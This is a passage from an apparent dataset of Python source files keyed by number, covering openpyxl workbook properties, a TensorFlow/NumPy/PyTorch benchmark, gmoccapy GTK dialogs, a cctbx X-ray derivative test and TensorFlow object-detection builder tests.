label=tmp_dir,\n                )\n    try:\n        calc.prepare_input_files()\n        raise AssertionError\n    except ValueError:\n        pass\n\n    calc.atoms = water\n    calc.prepare_input_files()\n    for f in ['control.in', 'geometry.in']:\n        assert os.path.isfile(os.path.join(tmp_dir,f))\n", "111": "# Copyright (c) 2010-2019 openpyxl\n\nfrom openpyxl.descriptors.serialisable import Serialisable\nfrom openpyxl.descriptors import (\n    String,\n    Float,\n    Integer,\n    Bool,\n    NoneSet,\n    Set,\n)\n\nfrom openpyxl.descriptors.excel import Guid\n\n\nclass WorkbookProperties(Serialisable):\n\n    tagname = \"workbookPr\"\n\n    date1904 = Bool(allow_none=True)\n    dateCompatibility = Bool(allow_none=True)\n    showObjects = NoneSet(values=(['all', 'placeholders']))\n    showBorderUnselectedTables = Bool(allow_none=True)\n    filterPrivacy = Bool(allow_none=True)\n    promptedSolutions = Bool(allow_none=True)\n    showInkAnnotation = Bool(allow_none=True)\n    backupFile = Bool(allow_none=True)\n    saveExternalLinkValues = Bool(allow_none=True)\n    updateLinks = NoneSet(values=(['userSet', 'never', 'always']))\n    codeName = String(allow_none=True)\n    hidePivotFieldList = Bool(allow_none=True)\n    showPivotChartFilter = Bool(allow_none=True)\n    allowRefreshQuery = Bool(allow_none=True)\n    publishItems = Bool(allow_none=True)\n    checkCompatibility = Bool(allow_none=True)\n    autoCompressPictures = Bool(allow_none=True)\n    refreshAllConnections = Bool(allow_none=True)\n    defaultThemeVersion = Integer(allow_none=True)\n\n    def __init__(self,\n                 date1904=None,\n                 dateCompatibility=None,\n                 showObjects=None,\n                 showBorderUnselectedTables=None,\n                 filterPrivacy=None,\n                 promptedSolutions=None,\n                 showInkAnnotation=None,\n                 backupFile=None,\n                 saveExternalLinkValues=None,\n                 updateLinks=None,\n                 codeName=None,\n                 hidePivotFieldList=None,\n                 showPivotChartFilter=None,\n                 allowRefreshQuery=None,\n                 publishItems=None,\n                 checkCompatibility=None,\n                 autoCompressPictures=None,\n                 refreshAllConnections=None,\n                 defaultThemeVersion=None,\n                ):\n        self.date1904 = date1904\n        self.dateCompatibility = dateCompatibility\n        self.showObjects = showObjects\n        self.showBorderUnselectedTables = showBorderUnselectedTables\n        self.filterPrivacy = filterPrivacy\n        self.promptedSolutions = promptedSolutions\n        self.showInkAnnotation = showInkAnnotation\n        self.backupFile = backupFile\n        self.saveExternalLinkValues = saveExternalLinkValues\n        self.updateLinks = updateLinks\n        self.codeName = codeName\n        self.hidePivotFieldList = hidePivotFieldList\n        self.showPivotChartFilter = showPivotChartFilter\n        self.allowRefreshQuery = allowRefreshQuery\n        self.publishItems = publishItems\n        self.checkCompatibility = checkCompatibility\n        self.autoCompressPictures = autoCompressPictures\n        self.refreshAllConnections = refreshAllConnections\n        self.defaultThemeVersion = defaultThemeVersion\n\n\nclass CalcProperties(Serialisable):\n\n    tagname = \"calcPr\"\n\n    calcId = Integer()\n    calcMode = NoneSet(values=(['manual', 'auto', 'autoNoTable']))\n    fullCalcOnLoad = Bool(allow_none=True)\n    refMode = NoneSet(values=(['A1', 'R1C1']))\n    iterate = Bool(allow_none=True)\n    iterateCount = Integer(allow_none=True)\n    iterateDelta = Float(allow_none=True)\n    fullPrecision = Bool(allow_none=True)\n    calcCompleted = Bool(allow_none=True)\n    calcOnSave = Bool(allow_none=True)\n    concurrentCalc = Bool(allow_none=True)\n    concurrentManualCount = Integer(allow_none=True)\n    forceFullCalc = Bool(allow_none=True)\n\n    def __init__(self,\n                 calcId=124519,\n                 calcMode=None,\n                 fullCalcOnLoad=True,\n                 refMode=None,\n                 iterate=None,\n                 iterateCount=None,\n                 iterateDelta=None,\n                 fullPrecision=None,\n                 calcCompleted=None,\n                 calcOnSave=None,\n                 concurrentCalc=None,\n                 concurrentManualCount=None,\n                 forceFullCalc=None,\n                ):\n        self.calcId = calcId\n        self.calcMode = calcMode\n        self.fullCalcOnLoad = fullCalcOnLoad\n        self.refMode = refMode\n        self.iterate = iterate\n        self.iterateCount = iterateCount\n        self.iterateDelta = iterateDelta\n        self.fullPrecision = fullPrecision\n        self.calcCompleted = calcCompleted\n        self.calcOnSave = calcOnSave\n        self.concurrentCalc = concurrentCalc\n        self.concurrentManualCount = concurrentManualCount\n        self.forceFullCalc = forceFullCalc\n\n\nclass FileVersion(Serialisable):\n\n    tagname = \"fileVersion\"\n\n    appName = String(allow_none=True)\n    lastEdited = String(allow_none=True)\n    lowestEdited = String(allow_none=True)\n    rupBuild = String(allow_none=True)\n    codeName = Guid(allow_none=True)\n\n    def __init__(self,\n                 appName=None,\n                 lastEdited=None,\n                 lowestEdited=None,\n                 rupBuild=None,\n                 codeName=None,\n                ):\n        self.appName = appName\n        self.lastEdited = lastEdited\n        self.lowestEdited = lowestEdited\n        self.rupBuild = rupBuild\n        self.codeName = codeName\n", "112": "# Copyright (c) 2010-2019 openpyxl\n\nfrom openpyxl.descriptors.serialisable import Serialisable\nfrom openpyxl.descriptors import (\n    String,\n    Float,\n    Integer,\n    Bool,\n    NoneSet,\n    Set,\n)\n\nfrom openpyxl.descriptors.excel import Guid\n\n\nclass WorkbookProperties(Serialisable):\n\n    tagname = \"workbookPr\"\n\n    date1904 = Bool(allow_none=True)\n    dateCompatibility = Bool(allow_none=True)\n    showObjects = NoneSet(values=(['all', 'placeholders']))\n    showBorderUnselectedTables = Bool(allow_none=True)\n    filterPrivacy = Bool(allow_none=True)\n    promptedSolutions = Bool(allow_none=True)\n    showInkAnnotation = Bool(allow_none=True)\n    backupFile = Bool(allow_none=True)\n    saveExternalLinkValues = Bool(allow_none=True)\n    updateLinks = NoneSet(values=(['userSet', 'never', 'always']))\n    codeName = String(allow_none=True)\n    hidePivotFieldList = Bool(allow_none=True)\n    showPivotChartFilter = Bool(allow_none=True)\n    allowRefreshQuery = Bool(allow_none=True)\n    publishItems = Bool(allow_none=True)\n    checkCompatibility = Bool(allow_none=True)\n    autoCompressPictures = Bool(allow_none=True)\n    refreshAllConnections = Bool(allow_none=True)\n    defaultThemeVersion = Integer(allow_none=True)\n\n    def __init__(self,\n                 date1904=None,\n                 dateCompatibility=None,\n                 showObjects=None,\n                 showBorderUnselectedTables=None,\n                 filterPrivacy=None,\n                 promptedSolutions=None,\n                 showInkAnnotation=None,\n                 backupFile=None,\n                 saveExternalLinkValues=None,\n                 updateLinks=None,\n                 codeName=None,\n                 hidePivotFieldList=None,\n                 showPivotChartFilter=None,\n                 allowRefreshQuery=None,\n                 publishItems=None,\n                 checkCompatibility=None,\n                 autoCompressPictures=None,\n                 refreshAllConnections=None,\n                 defaultThemeVersion=None,\n                ):\n        self.date1904 = date1904\n        self.dateCompatibility = dateCompatibility\n        self.showObjects = showObjects\n        self.showBorderUnselectedTables = showBorderUnselectedTables\n        self.filterPrivacy = filterPrivacy\n        self.promptedSolutions = promptedSolutions\n        self.showInkAnnotation = showInkAnnotation\n        self.backupFile = backupFile\n        self.saveExternalLinkValues = saveExternalLinkValues\n        self.updateLinks = updateLinks\n        self.codeName = codeName\n        self.hidePivotFieldList = hidePivotFieldList\n        self.showPivotChartFilter = showPivotChartFilter\n        self.allowRefreshQuery = allowRefreshQuery\n        self.publishItems = publishItems\n        self.checkCompatibility = checkCompatibility\n        self.autoCompressPictures = autoCompressPictures\n        self.refreshAllConnections = refreshAllConnections\n        self.defaultThemeVersion = defaultThemeVersion\n\n\nclass CalcProperties(Serialisable):\n\n    tagname = \"calcPr\"\n\n    calcId = Integer()\n    calcMode = NoneSet(values=(['manual', 'auto', 'autoNoTable']))\n    fullCalcOnLoad = Bool(allow_none=True)\n    refMode = NoneSet(values=(['A1', 'R1C1']))\n    iterate = Bool(allow_none=True)\n    iterateCount = Integer(allow_none=True)\n    iterateDelta = Float(allow_none=True)\n    fullPrecision = Bool(allow_none=True)\n    calcCompleted = Bool(allow_none=True)\n    calcOnSave = Bool(allow_none=True)\n    concurrentCalc = Bool(allow_none=True)\n    concurrentManualCount = Integer(allow_none=True)\n    forceFullCalc = Bool(allow_none=True)\n\n    def __init__(self,\n                 calcId=124519,\n                 calcMode=None,\n                 fullCalcOnLoad=True,\n                 refMode=None,\n                 iterate=None,\n                 iterateCount=None,\n                 iterateDelta=None,\n                 fullPrecision=None,\n                 calcCompleted=None,\n                 calcOnSave=None,\n                 concurrentCalc=None,\n                 concurrentManualCount=None,\n                 forceFullCalc=None,\n                ):\n        self.calcId = calcId\n        self.calcMode = calcMode\n        self.fullCalcOnLoad = fullCalcOnLoad\n        self.refMode = refMode\n        self.iterate = iterate\n        self.iterateCount = iterateCount\n        self.iterateDelta = iterateDelta\n        self.fullPrecision = fullPrecision\n        self.calcCompleted = calcCompleted\n        self.calcOnSave = calcOnSave\n        self.concurrentCalc = concurrentCalc\n        self.concurrentManualCount = concurrentManualCount\n        self.forceFullCalc = forceFullCalc\n\n\nclass FileVersion(Serialisable):\n\n    tagname = \"fileVersion\"\n\n    appName = String(allow_none=True)\n    lastEdited = String(allow_none=True)\n    lowestEdited = String(allow_none=True)\n    rupBuild = String(allow_none=True)\n    codeName = Guid(allow_none=True)\n\n    def __init__(self,\n                 appName=None,\n                 lastEdited=None,\n                 lowestEdited=None,\n                 rupBuild=None,\n                 codeName=None,\n                ):\n        self.appName = appName\n        self.lastEdited = lastEdited\n        self.lowestEdited = lowestEdited\n        self.rupBuild = rupBuild\n        self.codeName = codeName\n", "113": "\"\"\"Benchmark of different frameworks for playing around.\n\nno GPU used, serial required (x used in ever next calculation)\n| sample_size | tf traced  | tf eager | numpy |\n| 1k        | 0.001      | 0.004      | 0.001 |\n| 10 k      | 0.005      | 0.013      | 0.007 |\n| 100 k     | 0.015      | 0.03       | 0.07  |\n| 1 mio     | 0.2        | 0.3        | 0.7   |\n| 10 mio    | 2          | 3          | 7     |\n\n\nno GPU used, parallel possible, list of 10\n| sample_size | tf traced  | tf eager | numpy | torch |\n| 1k        | 0.0002     | 0.004      | 0.001 | 0.001 |\n| 10 k      | 0.0008     | 0.014      | 0.008 | 0.004 |\n| 100 k     | 0.002      | 0.04       | 0.08  | 0.02  |\n| 1 mio     | 0.02       | 0.4        | 0.8   | 0.3   |\n| 10 mio    | 0.2        | 4          | 8     | 3     |\n            (with autograph 2 secs)\n\n\"\"\"\n\nimport numba as numba\nimport numpy as np\nimport tensorflow as tf\nimport torch\nfrom zfit_benchmark.timer import Timer\n\nglobal_y = tf.random.normal(shape=(10, 1))\nvar1 = tf.Variable(42.)\n\nlist1 = [1, 2, 3, 4]\nsize = (10000000,)\nn_loops = 10\n\n\ndef dummy():\n    normal = np.random.normal(size=100000)\n    list1.append(np.sum(normal))\n\n\ndef calc_np(x):\n    # x = x.numpy()\n    # dummy()\n    # x = x * global_y.numpy()\n    # x = zfit.run(x * global_y)\n    # x *= var1.numpy()\n    x_init = x\n    list1 = []\n    for i in range(n_loops):\n        x = np.sqrt(np.abs(x_init))\n        x = np.cos(x - 0.3)\n        x = np.power(x, i + 1)\n        x = np.sinh(x + 0.4)\n        x = x ** 2\n        x += np.random.normal(size=size)\n        x /= np.mean(x)\n        x = np.abs(x)\n        list1.append(x)\n    x = np.sum(list1, axis=0)\n    x = np.mean(np.log(x))\n    return x\n\n\n@tf.function(autograph=True)\ndef calc_tf(x):\n    x_init = x\n    list1 = []\n    for i in tf.range(n_loops):\n    # for i in range(n_loops):\n        x = tf.sqrt(tf.abs(x_init * (tf.cast(i, dtype=tf.float64) + 1.)))\n        print(x)\n        x = tf.cos(x - 0.3)\n        x = tf.pow(x, tf.cast(i + 1, tf.float64))\n        x = tf.sinh(x + 0.4)\n        # print(\"calc_tf is being traced\")\n        x = x ** 2\n        x += tf.random.normal(shape=size, dtype=tf.float64)\n        x /= tf.reduce_mean(x)\n        x = tf.abs(x)\n        list1.append(x)\n    x = tf.reduce_sum(x, axis=0)\n    x = tf.reduce_mean(tf.math.log(x))\n    # tf.py_function(dummy, [], Tout=[])\n    return x\n\n\n# @torch.jit.script\ndef calc_torch(x):\n    x_init = x\n    list1 = []\n    for i in range(n_loops):\n        x = torch.sqrt(torch.abs(x_init))\n        x = torch.cos(x - 0.3)\n        x = torch.pow(x, i + 1)\n        x = torch.sinh(x + 0.4)\n        x = x ** 2\n        x += torch.normal(mean=0, std=0, size=size)\n        x /= torch.mean(x)\n        x = torch.abs(x)\n        list1.append(x)\n    list1 = torch.stack(list1)\n    x = torch.sum(list1, dim=0)\n    x = torch.mean(torch.log(x))\n    return x.numpy()\n\n\n@tf.function\ndef calc_np_wrapped(x):\n    return tf.py_function(calc_np, [x], Tout=tf.float32)\n\n\n@tf.function\ndef calc_torch_wrapped(x):\n    return tf.py_function(calc_torch, [x], Tout=tf.float32)\n\n\n@numba.jit(nopython=True)\ndef calc_np_numba(x):\n    for i in range(n_loops):\n        x = np.sqrt(np.abs(x))\n        x = np.cos(x - 0.3)\n        x = np.power(x, i)\n        x = np.sinh(x + 0.4)\n        x = x ** 2\n        x = np.mean(np.log(x))\n        x += np.random.normal(size=size)\n    return x\n\n\nif __name__ == '__main__':\n    x_tf = tf.random.normal(shape=size, dtype=tf.float64)\n    x_torch = torch.normal(mean=0, std=0, size=size)\n    # x = x.numpy()\n    # y = zfit.run(calc_tf(x))\n    # x = zfit.run(x)\n    results = []\n    # calc_tf_graph = calc_tf(x)\n    # calc_np_wrapped_graph = calc_np_wrapped(x)\n    # grad = tf.gradients(calc_np_wrapped_graph, x)\n    # grad = tf.gradients(calc_tf_graph, x)\n    # print(zfit.run(grad))\n    # x = np.random.normal(size=size)\n    y = calc_np(x_tf)\n    y = calc_tf(x_tf)\n    y = calc_torch(x_torch)\n\n    # y = calc_np_numba(x)\n    tf.config.experimental.set_synchronous_execution(\n        False\n    )\n\n    with Timer() as timer:\n        n_runs = 3\n        for _ in range(n_runs):\n            # x = tf.random.normal(shape=size)\n            # with tf.GradientTape() as tape:\n            #     tape.watch(x)\n            # y = calc_np_wrapped(x)\n            # y = calc_np(x_tf)\n            y = calc_tf(x_tf)\n            # y = calc_torch(x_torch)\n            # y = calc_torch_wrapped(x)\n            # y = zfit.run(calc_tf_graph)\n            # y = zfit.run(calc_np_wrapped_graph)\n            # x = torch.normal(0, 1, size=size)\n            # y = calc_np_numba(x)\n            # if not v2behavior:\n            #     zfit.run()\n            # gradients = tape.gradient(y, x)\n            # print(gradients)\n            results.append(y)\n    print(f\"{np.average(results)} +- {np.std(results)}\")\n    print(f\"Time needed: {timer.elapsed / n_runs :.3} sec\")\n", "114": "#!/usr/bin/env python\n\n'''\n    This class is used to handle the dialogs from gmoccapy,\n    it is just a coppy of a class from gscreen and has been slighly modified\n\n    Copyright 2014 Norbert Schechner\n    nieson@web.de\n\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program; if not, write to the Free Software\n    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\n'''\n\nimport gtk\nimport gladevcp\nimport pango\n\nimport gobject\n\nclass Dialogs(gobject.GObject):\n\n    __gtype_name__ = 'Dialogs'\n\n    __gsignals__ = {\n                'play_sound': (gobject.SIGNAL_RUN_FIRST, gobject.TYPE_NONE, (gobject.TYPE_STRING,)),\n               }\n\n    def __init__(self):\n        gobject.GObject.__init__(self)\n\n    # This dialog is for unlocking the system tab\n    # The unlock code number is defined at the top of the page\n    def system_dialog(self, caller):\n        dialog = gtk.Dialog(_(\"Enter System Unlock Code\"),\n                   caller.widgets.window1,\n                   gtk.DIALOG_DESTROY_WITH_PARENT,\n                   (gtk.STOCK_CANCEL, gtk.RESPONSE_REJECT,\n                    gtk.STOCK_OK, gtk.RESPONSE_ACCEPT))\n        label = gtk.Label(_(\"Enter System Unlock Code\"))\n        label.modify_font(pango.FontDescription(\"sans 20\"))\n        calc = gladevcp.Calculator()\n        dialog.vbox.pack_start(label)\n        dialog.vbox.add(calc)\n        calc.set_value(\"\")\n        calc.set_property(\"font\", \"sans 20\")\n        calc.set_editable(True)\n        calc.entry.connect(\"activate\", lambda w : dialog.emit(\"response\", gtk.RESPONSE_ACCEPT))\n        dialog.parse_geometry(\"400x400\")\n        dialog.set_decorated(True)\n        dialog.show_all()\n        self.emit(\"play_sound\", \"alert\")\n        response = dialog.run()\n        code = calc.get_value()\n        dialog.destroy()\n        if response == gtk.RESPONSE_ACCEPT:\n            if code == int(caller.unlock_code):\n                return True\n        return False\n\n    def entry_dialog(self, caller, data = None, header = _(\"Enter value\") , label = _(\"Enter the value to set\"), integer = False):\n        dialog = gtk.Dialog(header,\n                   caller.widgets.window1,\n                   gtk.DIALOG_DESTROY_WITH_PARENT,\n                   (gtk.STOCK_CANCEL, gtk.RESPONSE_REJECT,\n                    gtk.STOCK_OK, gtk.RESPONSE_ACCEPT))\n        label = gtk.Label(label)\n        label.modify_font(pango.FontDescription(\"sans 20\"))\n        calc = gladevcp.Calculator()\n        dialog.vbox.pack_start(label)\n        dialog.vbox.add(calc)\n        if data != None:\n            calc.set_value(data)\n        else:\n            calc.set_value(\"\")\n        calc.set_property(\"font\", \"sans 20\")\n        calc.set_editable(True)\n        calc.entry.connect(\"activate\", lambda w : dialog.emit(\"response\", gtk.RESPONSE_ACCEPT))\n        dialog.parse_geometry(\"400x400\")\n        dialog.set_decorated(True)\n        self.emit(\"play_sound\", \"alert\")\n        if integer: # The user is only allowed to enter integer values, we hide some button\n            calc.num_pad_only(True)\n            calc.integer_entry_only(True)\n        dialog.show_all()\n        response = dialog.run()\n        value = calc.get_value()\n        dialog.destroy()\n        if response == gtk.RESPONSE_ACCEPT:\n            if value != None:\n                if integer:\n                    return int(value)\n                else:\n                    return float(value)\n            else:\n                return \"ERROR\"\n        return \"CANCEL\"\n\n    # display warning dialog\n    def warning_dialog(self, caller, message, secondary = None, title = _(\"Operator Message\"), sound = True):\n        dialog = gtk.MessageDialog(caller.widgets.window1,\n            gtk.DIALOG_DESTROY_WITH_PARENT,\n            gtk.MESSAGE_INFO, gtk.BUTTONS_OK, message)\n        # if there is a secondary message then the first message text is bold\n        if secondary:\n            dialog.format_secondary_text(secondary)\n        dialog.show_all()\n        if sound:\n            self.emit(\"play_sound\", \"alert\")\n        dialog.set_title(title)\n        responce = dialog.run()\n        dialog.destroy()\n        return responce == gtk.RESPONSE_OK\n\n    def yesno_dialog(self, caller, message, title = _(\"Operator Message\")):\n        dialog = gtk.MessageDialog(caller.widgets.window1,\n                                   gtk.DIALOG_DESTROY_WITH_PARENT,\n                                   gtk.MESSAGE_QUESTION,\n                                   gtk.BUTTONS_YES_NO)\n        if title:\n            dialog.set_title(str(title))\n        dialog.set_markup(message)\n        dialog.show_all()\n        self.emit(\"play_sound\", \"alert\")\n        responce = dialog.run()\n        dialog.destroy()\n        return responce == gtk.RESPONSE_YES\n\n    def show_user_message(self, caller, message, title = _(\"Operator Message\")):\n        dialog = gtk.MessageDialog(caller.widgets.window1,\n                                   gtk.DIALOG_DESTROY_WITH_PARENT,\n                                   gtk.MESSAGE_INFO,\n                                   gtk.BUTTONS_OK)\n        if title:\n            dialog.set_title(str(title))\n        dialog.set_markup(message)\n        dialog.show_all()\n        self.emit(\"play_sound\", \"alert\")\n        responce = dialog.run()\n        dialog.destroy()\n        return responce == gtk.RESPONSE_OK\n\n    # dialog for run from line\n    def restart_dialog(self, caller):\n\n        # highlight the gcode down one line lower\n        # used for run-at-line restart\n        def restart_down(widget, obj, calc):\n            obj.widgets.gcode_view.line_down()\n            line = int(obj.widgets.gcode_view.get_line_number())\n            calc.set_value(line)\n\n        # highlight the gcode down one line higher\n        # used for run-at-line restart\n        def restart_up(widget, obj, calc):\n            obj.widgets.gcode_view.line_up()\n            line = int(obj.widgets.gcode_view.get_line_number())\n            calc.set_value(line)\n\n        # highlight the gcode of the entered line\n        # used for run-at-line restart\n        def enter_button(widget, obj, calc):\n            line = int(calc.get_value())\n            obj.start_line = line\n            obj.widgets.gcode_view.set_line_number(line)\n\n        restart_dialog = gtk.Dialog(_(\"Restart Entry\"),\n                   caller.widgets.window1, gtk.DIALOG_DESTROY_WITH_PARENT,\n                   (gtk.STOCK_CANCEL, gtk.RESPONSE_REJECT,\n                     gtk.STOCK_OK, gtk.RESPONSE_ACCEPT))\n        label = gtk.Label(_(\"Restart Entry\"))\n        label.modify_font(pango.FontDescription(\"sans 20\"))\n        restart_dialog.vbox.pack_start(label)\n        calc = gladevcp.Calculator()\n        restart_dialog.vbox.add(calc)\n        calc.set_value(\"%d\" % caller.widgets.gcode_view.get_line_number())\n        calc.set_property(\"font\", \"sans 20\")\n        calc.set_editable(True)\n        calc.num_pad_only(True)\n        calc.integer_entry_only(True)\n        calc.entry.connect(\"activate\", enter_button, caller, calc)\n        box = gtk.HButtonBox()\n        upbutton = gtk.Button(label = _(\"Up\"))\n        box.add(upbutton)\n        enterbutton = gtk.Button(label = _(\"Enter\"))\n        box.add(enterbutton)\n        downbutton = gtk.Button(label = _(\"Down\"))\n        box.add(downbutton)\n        calc.calc_box.pack_end(box, expand = False, fill = False, padding = 0)\n        upbutton.connect(\"clicked\", restart_up, caller, calc)\n        downbutton.connect(\"clicked\", restart_down, caller, calc)\n        enterbutton.connect(\"clicked\", enter_button, caller, calc)\n        restart_dialog.parse_geometry(\"400x400+0+0\")\n        restart_dialog.show_all()\n        self.emit(\"play_sound\", \"alert\")\n        result = restart_dialog.run()\n        restart_dialog.destroy()\n        if result == gtk.RESPONSE_REJECT:\n            line = 0\n        else:\n            line = int(calc.get_value())\n            if line == None:\n                line = 0\n        caller.widgets.gcode_view.set_line_number(line)\n        caller.start_line = line\n", "115": "from __future__ import absolute_import, division, print_function\nimport cctbx.xray.targets\nfrom cctbx.array_family import flex\nfrom libtbx.test_utils import approx_equal\nfrom six.moves import range\n\ndef calc_k(f_obs, i_calc):\n  fc = flex.sqrt(i_calc)\n  num = flex.sum(f_obs * fc)\n  den = flex.sum(fc * fc)\n  assert den != 0\n  k = num / den\n  return k\n\ndef calc_w(wa, wb, i_obs, i_sig, i_calc, k):\n  assert i_sig.size() == i_obs.size()\n  assert i_calc.size() == i_obs.size()\n  ik = i_obs / k**2\n  sk = i_sig / k**2\n  ik.set_selected(ik < 0, 0)\n  p = (ik + 2 * i_calc) / 3\n  den = flex.pow2(sk) + flex.pow2(wa*p) + wb*p\n  assert den.all_gt(1e-8)\n  weights = 1 / den\n  return weights\n\ndef calc_t(i_obs, i_calc, k, weights):\n  delta = i_obs - k**2 * i_calc\n  t_num = flex.sum(weights * flex.pow2(delta))\n  t_den = flex.sum(weights * flex.pow2(i_obs))\n  assert t_den != 0\n  return t_num / t_den\n\ndef kwt(f_obs, i_obs, i_sig, f_calc, i_calc, wa, wb):\n  if (f_calc is not None):\n    i_calc = flex.norm(f_calc)\n  k = calc_k(f_obs, i_calc)\n  weights = calc_w(\n    wa=wa,\n    wb=wb,\n    i_obs=i_obs,\n    i_sig=i_sig,\n    i_calc=i_calc,\n    k=k)\n  t = calc_t(\n    i_obs=i_obs,\n    i_calc=i_calc,\n    k=k,\n    weights=weights)\n  return k, weights, t\n\ndef kwt2(f_obs, i_obs, i_sig, f_calc, i_calc, wa, wb):\n  k, weights, t = kwt(f_obs, i_obs, i_sig, f_calc, i_calc, wa, wb)\n  trg = cctbx.xray.targets.shelxl_wght_ls(\n    f_obs=f_obs,\n    i_obs=i_obs,\n    i_sig=i_sig,\n    f_calc=f_calc,\n    i_calc=i_calc,\n    wa=wa,\n    wb=wb)\n  assert approx_equal(trg.scale_factor, k)\n  assert approx_equal(trg.weights, weights)\n  assert approx_equal(trg.target, t)\n  return trg\n\ndef exercise(mt, n_refl):\n  f_obs = mt.random_double(size=n_refl)\n  i_obs = flex.pow2(f_obs)\n  i_sig = mt.random_double(size=i_obs.size())\n  f_calc = flex.complex_double(\n    mt.random_double(size=f_obs.size()),\n    mt.random_double(size=f_obs.size()))\n  i_calc = flex.norm(f_calc)\n  wa = 1.23\n  wb = 2.34\n  trg = kwt2(\n    f_obs=f_obs, i_obs=i_obs, i_sig=i_sig,\n    f_calc=f_calc, i_calc=None, wa=wa, wb=wb)\n  def check_i_derivs():\n    g_ana = trg.i_gradients\n    c_ana = trg.i_curvatures\n    eps = 1e-6\n    g_fin = flex.double()\n    c_fin = flex.double()\n    for ih in range(i_calc.size()):\n      fs = []\n      gs = []\n      c_orig = i_calc[ih]\n      for signed_eps in [eps, -eps]:\n        i_calc[ih] = c_orig + signed_eps\n        trg_eps = kwt2(\n          f_obs=f_obs, i_obs=i_obs, i_sig=i_sig,\n          f_calc=None, i_calc=i_calc, wa=wa, wb=wb)\n        fs.append(trg_eps.target)\n        gs.append(trg_eps.i_gradients[ih])\n      g_fin.append((fs[0]-fs[1])/(2*eps))\n      c_fin.append((gs[0]-gs[1])/(2*eps))\n      i_calc[ih] = c_orig\n    assert approx_equal(g_ana, g_fin)\n    assert approx_equal(c_ana, c_fin)\n  def check_f_derivs():\n    g_ana = trg.f_gradients\n    c_ana = trg.f_hessians\n    eps = 1e-6\n    g_fin = flex.complex_double()\n    c_fin = flex.vec3_double()\n    for ih in range(i_calc.size()):\n      c_orig = f_calc[ih]\n      g_fin_ab = []\n      c_fin_ab = []\n      for iab in [0,1]:\n        fs = []\n        gs = []\n        for signed_eps in [eps, -eps]:\n          if (iab == 0):\n            f_calc[ih] = complex(c_orig.real + signed_eps, c_orig.imag)\n          else:\n            f_calc[ih] = complex(c_orig.real, c_orig.imag + signed_eps)\n          trg_eps = kwt2(\n            f_obs=f_obs, i_obs=i_obs, i_sig=i_sig,\n            f_calc=f_calc, i_calc=None, wa=wa, wb=wb)\n          fs.append(trg_eps.target)\n          gs.append(trg_eps.f_gradients[ih])\n        g_fin_ab.append((fs[0]-fs[1])/(2*eps))\n        c_fin_ab.append((gs[0]-gs[1])/(2*eps))\n      g_fin.append(complex(*g_fin_ab))\n      assert approx_equal(c_fin_ab[0].imag, c_fin_ab[1].real)\n      c_fin.append((c_fin_ab[0].real, c_fin_ab[1].imag, c_fin_ab[0].imag))\n      f_calc[ih] = c_orig\n    assert approx_equal(g_ana, g_fin)\n    assert approx_equal(c_ana, c_fin)\n  check_i_derivs()\n  check_f_derivs()\n\ndef run(args):\n  assert len(args) < 3\n  arg_vals = [int(arg) for arg in args]\n  arg_vals = arg_vals + [3, 2][len(arg_vals):]\n  n_refl, n_trials = arg_vals\n  assert n_refl > 0\n  assert n_trials > 0\n  mt = flex.mersenne_twister(seed=0)\n  for i_trial in range(n_trials):\n    exercise(mt, n_refl)\n  print(\"OK\")\n\nif (__name__ == \"__main__\"):\n  import sys\n  run(args=sys.argv[1:])\n", "116": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "117": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport 